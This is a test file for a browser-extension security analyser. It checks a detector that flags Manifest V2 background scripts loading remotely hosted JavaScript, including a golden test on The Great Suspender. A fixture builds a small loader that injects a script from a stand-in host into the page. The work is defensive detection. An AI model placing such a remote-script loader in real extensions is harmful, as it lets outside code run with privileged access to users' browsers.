import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { analyze } from "../src/pipeline/index.ts";
import { FakeLlmClient } from "../src/llm/fake.ts";
import { remoteScriptReviewer } from "../src/methodologies/dag/nodes/remote-script-reviewer.ts";
import { ZERO_USAGE, type NodeContext } from "../src/methodologies/dag/node.ts";
import { isGrounded, resolveEvidenceRefs, type Finding, type RefResolution } from "../src/methodologies/findings.ts";
import { isContentGrounded, newSourceCaches, type VerificationResult } from "../src/methodologies/claim-verifier.ts";
import { classifyFindings } from "../src/report/classify.ts";
import { adjustFindingHarm } from "../src/report/harm-adjust.ts";
import { computeVerdict } from "../src/report/verdict.ts";
import { buildCoverage, buildDestinations, buildDeveloper, buildObfuscation, buildPermissions } from "../src/report/build.ts";
import type { EvidencePack } from "../src/pipeline/schema.ts";

// The committed fixture: MV2, background.scripts, CSP whitelisting the remote
// host, and a background script reproducing the const + concat loader shape.
const FIXTURE_DIR = "test/fixtures/mv2-remote-script";
const GS_DIR = "example_crxs/the_great_suspender";

function ctx(pack: EvidencePack, sampleDir: string): NodeContext {
  return { pack, sampleDir, upstream: new Map(), listing: null, enrichment: null, client: new FakeLlmClient({}), model: "test-model", verifierModel: "test-model" };
}

// Fixture variants are built live in temp dirs (same pattern as cli.test.ts) —
// analyze() needs a real extension directory.
const tempDirs: string[] = [];
function writeExtension(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "rscript-"));
  tempDirs.push(dir);
  for (const [name, content] of Object.entries(files)) writeFileSync(join(dir, name), content);
  return dir;
}
afterAll(() => {
  for (const dir of tempDirs) rmSync(dir, { recursive: true, force: true });
});

const LOADER_JS = (host: string, element = "script", path = "/t.js") =>
  [
    `const base = "https://${host}";`,
    `const el = document.createElement("${element}");`,
    `el.src = base + "${path}";`,
    `document.head.appendChild(el);`,
    ``,
  ].join("\n");

const manifest = (over: Record<string, unknown> = {}) =>
  JSON.stringify({
    manifest_version: 2,
    name: "RS Variant",
    version: "1.0.0",
    background: { scripts: ["bg.js"], persistent: true },
    ...over,
  });

describe("remote-script-reviewer (MV2 fixture)", () => {
  const pack = analyze(FIXTURE_DIR, { analyzedAt: "2026-01-01T00:00:00Z" });

  it("gate fires and the corroborated loader emits exactly the verdict-floor shape", async () => {
    const c = ctx(pack, FIXTURE_DIR);
    expect(remoteScriptReviewer.gate(c)).toBe(true);

    const result = await remoteScriptReviewer.run(c);
    expect(result.status).toBe("ok");
    expect(result.findings).toHaveLength(1);
    expect(result.dismissals).toHaveLength(0);

    // Exactly the isRemoteHostedCode floor shape (verdict.ts): category
    // remote-resources + finding_type unwanted + severity high.
    const f = result.findings[0]!;
    expect(f.claim_type).toBe("observed-capability");
    expect(f.category).toBe("remote-resources");
    expect(f.finding_type).toBe("unwanted");
    expect(f.severity).toBe("high");
    expect(f.confidence).toBe("high");
    expect(f.claimed_mechanism).toBe(""); // observed-capability carries no causal story
    expect(f.title).toContain("rs-telemetry-cdn.example");
    expect(f.title).toContain("privileged");

    // Grounding pre-check: the cited file exists and the cited host is present
    // verbatim in it (content-grounding needle).
    const ref = f.evidence_refs[0]!;
    expect(ref.file).toBe("bg.js");
    expect(ref.location).toEqual({ line: 5 });
    expect(ref.sink_or_string).toBe("rs-telemetry-cdn.example");
    const res = resolveEvidenceRefs(f, FIXTURE_DIR);
    expect(isGrounded(res)).toBe(true);
    expect(isContentGrounded(f, res.resolved, FIXTURE_DIR, newSourceCaches())).toBe(true);
  });

  it("the emitted finding reaches high-risk end-to-end through classify → harm-adjust → verdict", async () => {
    const result = await remoteScriptReviewer.run(ctx(pack, FIXTURE_DIR));
    const findings: Finding[] = result.findings;

    // Same backend path collect.ts runs: classify, harm-adjust, then the
    // deterministic verdict over the pack-built sections.
    const resolutions = new Map<string, RefResolution>();
    for (const f of findings) resolutions.set(f.id, resolveEvidenceRefs(f, FIXTURE_DIR));
    const verification: VerificationResult = { resolutions, verdicts: new Map(), usage: ZERO_USAGE };
    const classified = classifyFindings({ summary: "", overall_risk: "", findings }, verification, FIXTURE_DIR);
    expect(classified.findings).toHaveLength(1);
    expect(classified.findings[0]!.kind).toBe("observed-capability");

    const sections = {
      permissions: buildPermissions(pack),
      destinations: buildDestinations(pack),
      obfuscation: buildObfuscation(pack),
      developer: buildDeveloper(pack.developer, null, null),
      coverage: buildCoverage(pack),
    };
    const adjusted = adjustFindingHarm(classified.findings, pack).findings;
    const verdict = computeVerdict(adjusted, sections);
    expect(verdict.tier).toBe("high-risk");
    expect(verdict.rationale).toContain("Remotely-hosted");
  });
});

describe("remote-script-reviewer (adjudication ladder variants)", () => {
  it("a known-analytics host is a dismissal, never a high finding", async () => {
    const dir = writeExtension({
      "manifest.json": manifest({
        content_security_policy: "script-src 'self' https://www.google-analytics.com; object-src 'self'",
      }),
      "bg.js": LOADER_JS("www.google-analytics.com", "script", "/analytics.js"),
    });
    const pack = analyze(dir);
    const c = ctx(pack, dir);
    expect(remoteScriptReviewer.gate(c)).toBe(true);

    const result = await remoteScriptReviewer.run(c);
    expect(result.findings).toHaveLength(0);
    expect(result.dismissals).toHaveLength(1);
    expect(result.dismissals[0]!.concern).toContain("www.google-analytics.com");
    expect(result.dismissals[0]!.note).toContain("telemetry");
  });

  it("a content-script loader is not a privileged context — the gate does not fire", () => {
    const dir = writeExtension({
      "manifest.json": JSON.stringify({
        manifest_version: 2,
        name: "RS Variant",
        version: "1.0.0",
        content_scripts: [{ matches: ["https://*/*"], js: ["cs.js"] }],
      }),
      "cs.js": LOADER_JS("rs-telemetry-cdn.example"),
    });
    const pack = analyze(dir);
    expect(remoteScriptReviewer.gate(ctx(pack, dir))).toBe(false);
  });

  it("MV3 dismisses the whole class (platform forbids remote script in privileged contexts)", async () => {
    const dir = writeExtension({
      "manifest.json": JSON.stringify({
        manifest_version: 3,
        name: "RS Variant",
        version: "1.0.0",
        background: { service_worker: "bg.js" },
      }),
      "bg.js": LOADER_JS("rs-telemetry-cdn.example"),
    });
    const pack = analyze(dir);
    const c = ctx(pack, dir);
    expect(remoteScriptReviewer.gate(c)).toBe(true); // candidates exist …

    const result = await remoteScriptReviewer.run(c);
    expect(result.findings).toHaveLength(0); // … but MV3 makes them inert
    expect(result.dismissals).toHaveLength(1);
    expect(result.dismissals[0]!.note).toContain("manifest_version 3");
  });

  it("an uncorroborated .src (img.src, no CSP whitelist) emits the sub-floor medium/'unknown' shape", async () => {
    const dir = writeExtension({
      "manifest.json": manifest(), // no CSP → no remote-script-src corroboration
      "bg.js": LOADER_JS("rs-telemetry-cdn.example", "img", "/pixel.png"),
    });
    const pack = analyze(dir);
    const result = await remoteScriptReviewer.run(ctx(pack, dir));

    expect(result.findings).toHaveLength(1);
    const f = result.findings[0]!;
    expect(f.severity).toBe("medium");
    expect(f.finding_type).toBe("unknown"); // 'unknown' never floors
    expect(f.confidence).toBe("medium");
    expect(f.title).toContain("Uncorroborated");
    expect(result.findings.some((x) => x.severity === "high")).toBe(false);
  });
});

// Golden block over the real Great Suspender sample (gitignored, local-only —
// same skip pattern as claim-verifier-golden.test.ts). Ground truth: the
// undisclosed cdn.owebanalytics.com load into the MV2 background page is the
// ban-worthy behavior; the disclosed Google-Analytics load is sub-floor.
describe.skipIf(!existsSync(GS_DIR))("remote-script-reviewer golden (The Great Suspender)", () => {
  let pack: EvidencePack;
  let findings: Finding[];

  beforeAll(async () => {
    pack = analyze(GS_DIR);
    const result = await remoteScriptReviewer.run(ctx(pack, GS_DIR));
    findings = result.findings;
  }, 300_000);

  it("gate fires on the pack's remote-script evidence", () => {
    expect(remoteScriptReviewer.gate(ctx(pack, GS_DIR))).toBe(true);
  });

  it("the cdn.owebanalytics.com load emits the high/unwanted floor shape, grounded in js/gsAnalytics.js", () => {
    const owa = findings.find((f) => f.title.includes("cdn.owebanalytics.com"));
    expect(owa).toBeDefined();
    expect(owa!.claim_type).toBe("observed-capability");
    expect(owa!.category).toBe("remote-resources");
    expect(owa!.finding_type).toBe("unwanted");
    expect(owa!.severity).toBe("high");
    expect(owa!.evidence_refs[0]!.file).toBe("js/gsAnalytics.js");
    expect(owa!.evidence_refs[0]!.sink_or_string).toBe("cdn.owebanalytics.com");

    const res = resolveEvidenceRefs(owa!, GS_DIR);
    expect(isGrounded(res)).toBe(true);
    expect(isContentGrounded(owa!, res.resolved, GS_DIR, newSourceCaches())).toBe(true);
  });

  it("the Google-Analytics load lands sub-floor: its unresolved loader site is medium/'unknown' and no high finding names GA", () => {
    // The GA URL is passed as a parameter to the loader (`a.src = g`), so its
    // loader site surfaces as the unresolved class-B row at gsAnalytics.js:195.
    const gaLoader = findings.find((f) => f.evidence_refs.some((r) => r.file === "js/gsAnalytics.js" && r.location?.line === 195));
    expect(gaLoader).toBeDefined();
    expect(gaLoader!.severity).toBe("medium");
    expect(gaLoader!.finding_type).toBe("unknown");

    const mentionsGa = (f: Finding) =>
      `${f.title} ${f.detail} ${f.evidence_refs.map((r) => r.sink_or_string ?? "").join(" ")}`.includes("google-analytics");
    expect(findings.some((f) => f.severity === "high" && mentionsGa(f))).toBe(false);
  });
});
